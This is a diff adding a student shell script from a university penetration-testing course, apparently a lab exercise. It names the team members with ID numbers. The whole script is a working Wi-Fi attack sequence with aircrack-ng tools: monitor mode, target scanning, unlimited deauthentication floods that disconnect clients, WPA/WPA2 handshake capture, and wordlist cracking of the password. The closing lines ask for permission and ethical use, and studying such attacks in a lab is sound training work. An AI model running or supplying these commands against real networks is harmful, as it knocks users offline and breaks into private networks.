@@ -1,0 +1,65 @@
+# ================================
+# Wireless Network Attacks Script
+# CYS405 Penetration Testing Project
+# Team Members:
+# - Yousif Al-Saleem 220110470
+# - Fahad Al-Medyan 220110472
+# Instructor: Dr. Asif Siddiqui
+# ================================
+
+# 1. Identify Wireless Interfaces
+# List all wireless network interfaces and their current modes
+iwconfig
+
+# 2. Kill Interfering Processes
+# Terminate processes that might interfere with monitor mode (e.g., NetworkManager)
+sudo airmon-ng check kill
+
+# 3. Start Monitor Mode
+# Enable monitor mode on the wireless interface (replace 'wlan0' with your interface name)
+sudo airmon-ng start wlan0
+
+# 4. Verify Monitor Mode
+# Confirm that the wireless interface is now in monitor mode (e.g., wlan0mon)
+iwconfig
+
+# 5. Scan for Available Wireless Networks
+# Use airodump-ng to scan for nearby wireless networks and identify target SSID, BSSID, and channel
+sudo airodump-ng wlan0mon
+
+# 6. Focus on Target Network
+# Narrow down the scan to the specific target network by specifying its BSSID and channel
+# Replace [BSSID] with the target network's MAC address and [Channel] with its channel number
+sudo airodump-ng -d [BSSID] -c [Channel] wlan0mon
+
+# 7. Execute Deauthentication Attack
+# Send deauthentication frames to the target network to disconnect connected clients
+# Replace [BSSID] with the target access point's MAC address
+sudo aireplay-ng --deauth 0 -a [BSSID] wlan0mon
+
+# 8. Capture the Handshake
+# Start capturing packets on the target network to capture the WPA/WPA2 four-way handshake
+# Replace [Channel] with the target network's channel and [BSSID] with its MAC address
+sudo airodump-ng -w capture -c [Channel] --bssid [BSSID] wlan0mon
+
+# 9. Deauthenticate Specific Client (Optional)
+# Target a specific client device to force a handshake capture
+# Replace [BSSID] with the access point's MAC address and [Client MAC] with the client's MAC address
+sudo aireplay-ng --deauth 4 -a [BSSID] -c [Client MAC] wlan0mon
+
+# 10. Verify Handshake Capture with Wireshark
+# Open the captured handshake file in Wireshark for analysis
+# Replace 'capture-01.cap' with your actual capture file name if different
+wireshark capture-01.cap
+
+# 11. Crack the Captured Password
+# Use aircrack-ng to attempt to crack the WPA/WPA2 password using a wordlist
+# Replace 'capture-01.cap' with your capture file and ensure the wordlist path is correct
+aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
+
+# ================================
+# Notes:
+# - Ensure you have the necessary permissions to perform these actions.
+# - Replace placeholders (e.g., [BSSID], [Channel], [Client MAC]) with actual values.
+# - Use this script responsibly and ethically within a controlled environment.
+# ================================
